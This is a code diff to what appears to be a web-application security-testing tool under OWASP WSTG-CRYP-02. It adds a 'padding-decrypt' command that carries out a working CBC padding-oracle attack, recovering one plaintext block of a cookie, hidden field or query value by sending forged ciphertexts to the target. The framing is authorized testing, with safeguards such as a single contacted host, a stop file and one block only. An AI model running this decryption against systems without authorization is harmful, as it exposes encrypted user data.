@@ -1,7 +1,15 @@
-"""Padding-oracle probe for CBC-encrypted client values (WSTG-CRYP-02, step 3).
+"""Padding-oracle probe and one-block decrypt for CBC-encrypted client values (WSTG-CRYP-02).
 
-`wstg-cryp padding-probe --base URL [--http-root DIR] [--har DIR] [--samples DIR]
-                         [--repeat N] [--max N] [--pause S]`
+`wstg-cryp padding-probe   --base URL [--http-root DIR] [--har DIR] [--samples DIR]
+                           [--repeat N] [--max N] [--pause S]`   (step 3: find oracles)
+`wstg-cryp padding-decrypt --base URL [the same evidence options] [--list |
+                           --candidate N] [--repeat N] [--pause S] [--stop-file F]`
+                                                                   (step 4: confirm one)
+
+padding-decrypt recovers one plaintext block of a value the probe flagged, by querying
+the oracle byte by byte (see decrypt_block). --list shows the candidate values without
+sending anything; --candidate N decrypts the Nth of them. Like the probe it contacts only
+the base host and reuses the logged-in session, and never prints a candidate's value.
 
 For each encrypted-looking value sent to the client (a cookie, a hidden form field such
 as ViewState, or a URL query parameter), the tool sends three versions of the same value
@@ -373,6 +381,14 @@ def _measure(c: Cand, send_value: str, repeat: int, pause: float) -> Measure:
     return Measure(status, int(median(sizes)), int(median(times)), len(statuses))
 
 
+_WHERE = {"cookie": "cookie", "hidden": "hidden field", "query": "query parameter"}
+
+
+def _label(c: Cand, codec: Codec, raw: bytes, bs: int) -> str:
+    return (f'{_WHERE[c.where]} "{c.name}" ({codec.name}, decoded={len(raw)}, block={bs}'
+            + (f", role={c.role}" if c.role else ", anonymous") + ")")
+
+
 def _verdict(orig: Measure, pad: Measure, gar: Measure) -> tuple[str, str]:
     if not (orig.answered and pad.answered and gar.answered):
         return "INCONCLUSIVE", "one or more cases got no answer"
@@ -413,9 +429,7 @@ def run(args) -> int:
         codec, raw = decode_candidate(c.value)
         bs = 16 if len(raw) % 16 == 0 else 8
         pad_raw, gar_raw = mutate(raw, bs)
-        where = {"cookie": "cookie", "hidden": "hidden field", "query": "query parameter"}[c.where]
-        label = (f'{where} "{c.name}" ({codec.name}, decoded={len(raw)}, block={bs}'
-                 + (f", role={c.role}" if c.role else ", anonymous") + ")")
+        label = _label(c, codec, raw, bs)
         meas = {
             "original": _measure(c, c.value, args.repeat, args.pause),
             "bad-padding": _measure(c, codec.encode(pad_raw, c.value), args.repeat, args.pause),
@@ -433,7 +447,7 @@ def run(args) -> int:
         tag, why = _verdict(meas["original"], meas["bad-padding"], meas["garbled"])
         if tag == "SUSPECTED-ORACLE":
             suspected += 1
-            print(f"    => SUSPECTED ORACLE: {why}. Confirm with padbuster (step 4, manual, by agreement).")
+            print(f"    => SUSPECTED ORACLE: {why}. Confirm with wstg-cryp padding-decrypt / Tools > Padding oracle decrypt (step 4, by agreement).")
         elif tag == "TIMING-DIFF":
             print(f"    => TIMING DIFFERENCE: {why}")
         elif tag == "INCONCLUSIVE":
@@ -445,7 +459,160 @@ def run(args) -> int:
         print(f"\nno request to {host} got an answer; check the scope and collect again", file=sys.stderr)
         return 4
     print(f"\n# verdict: {suspected} candidate(s) with a suspected padding-oracle signal, "
-          f"{sent - suspected} with none. padbuster is not run here (manual, needs agreement).")
+          f"{sent - suspected} with none. Confirm a flagged one with padding-decrypt (step 4, by agreement); none is decrypted here.")
+    return 0
+
+
+# ---- decryption (WSTG-CRYP-02 step 4: confirm a suspected oracle) ------------------
+#
+# A CBC padding oracle recovers one plaintext block without the key. To decrypt the
+# last block T of a value whose preceding block is P, the tool sends a two-block value
+# F | T with a forged first block F and asks the oracle "is the padding valid?" (the
+# response the step-3 probe found: the garbled-content case means valid padding, the
+# bad-padding case means invalid). Byte by byte, from the last, it finds the F byte that
+# makes the final padding valid for pad length 1, 2, ...: then the intermediate state is
+# I[j] = F[j] XOR pad, and the real plaintext is Pt[j] = I[j] XOR P[j]. Only one block is
+# decrypted (padbuster, limited); this contacts only the base host and keeps the session.
+
+
+class StopRequested(Exception):
+    pass
+
+
+def _classifier(ref_ok: Measure, ref_bad: Measure):
+    """A function telling a measured response apart as valid padding (True) or not,
+    from the valid-padding (garbled) and invalid-padding (bad) reference responses."""
+    if not (ref_ok.answered and ref_bad.answered):
+        return None
+    if ref_ok.status != ref_bad.status:
+        ok = ref_ok.status
+        return lambda m: m.answered and m.status == ok
+    if abs(ref_ok.size - ref_bad.size) >= 16:
+        ok, bad = ref_ok.size, ref_bad.size
+        return lambda m: m.answered and abs(m.size - ok) < abs(m.size - bad)
+    return None
+
+
+def _oracle_ok(c: Cand, codec: Codec, blocks: bytes, classify, repeat: int, pause: float) -> bool:
+    return classify(_measure(c, codec.encode(blocks, c.value), repeat, pause))
+
+
+def decrypt_block(c: Cand, codec: Codec, prev: bytes, target: bytes, classify, *,
+                  repeat: int, pause: float, bs: int, log=lambda s: None,
+                  should_stop=lambda: False) -> tuple[bytes, bytes]:
+    """Recover the intermediate state of one target block and its plaintext (I, Pt),
+    where Pt = I XOR prev. Raises StopRequested if should_stop() turns true."""
+    inter = bytearray(bs)
+    for pad in range(1, bs + 1):
+        pos = bs - pad
+        forged = bytearray(bs)
+        for k in range(pos + 1, bs):
+            forged[k] = inter[k] ^ pad
+        found = None
+        for guess in range(256):
+            if should_stop():
+                raise StopRequested()
+            forged[pos] = guess
+            if not _oracle_ok(c, codec, bytes(forged) + target, classify, repeat, pause):
+                continue
+            if pad == 1 and pos > 0:
+                # A false hit when the real last byte is already 0x02..: changing the
+                # byte before it must keep the padding valid for a true 0x01.
+                probe = bytearray(forged)
+                probe[pos - 1] ^= 0xff
+                if not _oracle_ok(c, codec, bytes(probe) + target, classify, repeat, pause):
+                    continue
+            found = guess
+            break
+        if found is None:
+            raise ValueError(f"no padding-valid byte at position {pos} (the oracle is unreliable "
+                             "or the signal changed); stopping")
+        inter[pos] = found ^ pad
+        plain = bytes(inter[k] ^ prev[k] for k in range(pos, bs))
+        log(f"    byte {pos + 1}/{bs} recovered: plaintext so far {plain.hex()}")
+    pt = bytes(inter[k] ^ prev[k] for k in range(bs))
+    return bytes(inter), pt
+
+
+def _show_block(pt: bytes) -> str:
+    n = pt[-1]
+    unpadded = pt[:-n] if 1 <= n <= len(pt) and pt[-n:] == bytes([n]) * n else pt
+    printable = "".join(chr(b) if 0x20 <= b < 0x7f else "." for b in pt)
+    tail = (f"  (PKCS#7 pad {n}, without padding: {unpadded.decode('utf-8', 'replace')!r})"
+            if unpadded is not pt else "")
+    return f"hex={pt.hex()}  text={printable!r}{tail}"
+
+
+def run_decrypt(args) -> int:
+    base = args.base.rstrip("/")
+    host = (urlsplit(base).hostname or "").lower()
+
+    def folder(v):
+        return Path(v) if v else None
+
+    cands, notes = gather(base, folder(args.http_root), folder(args.har), folder(args.samples))
+    cands = cands[:args.max]
+    if args.list:
+        print(f"# {len(cands)} candidate value(s) on {host} (no request sent). Decrypt one with"
+              " --candidate N (run the step-3 probe first to see which are SUSPECTED-ORACLE).")
+        for i, c in enumerate(cands, 1):
+            codec, raw = decode_candidate(c.value)
+            bs = 16 if len(raw) % 16 == 0 else 8
+            print(f"{i}\t{_label(c, codec, raw, bs)}")
+        if not cands:
+            print("(no encrypted-looking value found in the given evidence)")
+        return 0
+
+    if not 1 <= args.candidate <= len(cands):
+        print(f"--candidate must be 1..{len(cands)} (run --list to see them)", file=sys.stderr)
+        return 2
+    c = cands[args.candidate - 1]
+    codec, raw = decode_candidate(c.value)
+    bs = 16 if len(raw) % 16 == 0 else 8
+    if len(raw) < 2 * bs:
+        print(f"candidate {args.candidate} is a single {bs}-byte block: without the IV its plaintext "
+              "cannot be recovered. Pick a longer value.", file=sys.stderr)
+        return 2
+
+    stop = Path(args.stop_file) if args.stop_file else None
+
+    def should_stop() -> bool:
+        return bool(stop and stop.is_file())
+
+    print(f"# padding-oracle decrypt on {host}, candidate {args.candidate}: {_label(c, codec, raw, bs)}")
+    print(f"# {_WHERE[c.where]} {c.name} @ {c.method} {harmod._template(urlsplit(c.url).path) or '/'};"
+          f" Python HTTP client, only this host contacted, last block only")
+    for n in notes:
+        print(f"# note: {n}")
+
+    pad_raw, gar_raw = mutate(raw, bs)
+    ref_ok = _measure(c, codec.encode(gar_raw, c.value), args.repeat, args.pause)     # valid padding
+    ref_bad = _measure(c, codec.encode(pad_raw, c.value), args.repeat, args.pause)    # invalid padding
+    classify = _classifier(ref_ok, ref_bad)
+    if classify is None:
+        print("the oracle signal is not clear enough to decrypt (valid-padding and bad-padding "
+              "responses are too close); re-run the step-3 probe.", file=sys.stderr)
+        return 4
+    print(f"# oracle signal: valid padding ~ {ref_ok.status}/{ref_ok.size}B, "
+          f"invalid ~ {ref_bad.status}/{ref_bad.size}B. Up to {bs * 256} requests for this block.",
+          flush=True)
+
+    prev, target = raw[-2 * bs:-bs], raw[-bs:]
+    try:
+        inter, pt = decrypt_block(c, codec, prev, target, classify, repeat=args.repeat,
+                                  pause=args.pause, bs=bs, log=lambda s: print(s, flush=True),
+                                  should_stop=should_stop)
+    except StopRequested:
+        print("\nstopped before the block was finished; nothing recovered.", flush=True)
+        return 3
+    except ValueError as e:
+        print(f"\n{e}", file=sys.stderr)
+        return 4
+    print(f"\n# last block recovered ({args.candidate}: {c.name}):")
+    print(f"  intermediate: {inter.hex()}")
+    print(f"  plaintext:    {_show_block(pt)}")
+    print("\n# Record this block, the parameter, and the oracle signal as the finding. "
+          "Decrypt another candidate with --candidate N.", flush=True)
     return 0
 
 
@@ -460,8 +627,22 @@ def main(argv: list[str] | None = None) -> int:
     pp.add_argument("--repeat", type=int, default=DEFAULT_REPEAT, help="requests per case (median)")
     pp.add_argument("--max", type=int, default=DEFAULT_MAX, help="candidate values to probe")
     pp.add_argument("--pause", type=float, default=0, help="seconds between requests")
+
+    pd = sub.add_parser("padding-decrypt",
+                        help="decrypt one block of a suspected padding oracle (WSTG-CRYP-02 step 4)")
+    pd.add_argument("--base", required=True, help="base URL of the target (the only host contacted)")
+    pd.add_argument("--http-root", help="http-root-https evidence version folder")
+    pd.add_argument("--har", help="har-browse evidence version folder")
+    pd.add_argument("--samples", help="session-token-samples evidence version folder")
+    pd.add_argument("--list", action="store_true", help="list the candidate values and exit (no request)")
+    pd.add_argument("--candidate", type=int, default=0, help="1-based candidate to decrypt (see --list)")
+    pd.add_argument("--repeat", type=int, default=1, help="requests per oracle query (median)")
+    pd.add_argument("--max", type=int, default=DEFAULT_MAX, help="candidate values considered")
+    pd.add_argument("--pause", type=float, default=0, help="seconds between requests")
+    pd.add_argument("--stop-file", help="stop gracefully as soon as this file exists")
+
     args = ap.parse_args(argv)
-    return run(args)
+    return run_decrypt(args) if args.cmd == "padding-decrypt" else run(args)
 
 
 if __name__ == "__main__":
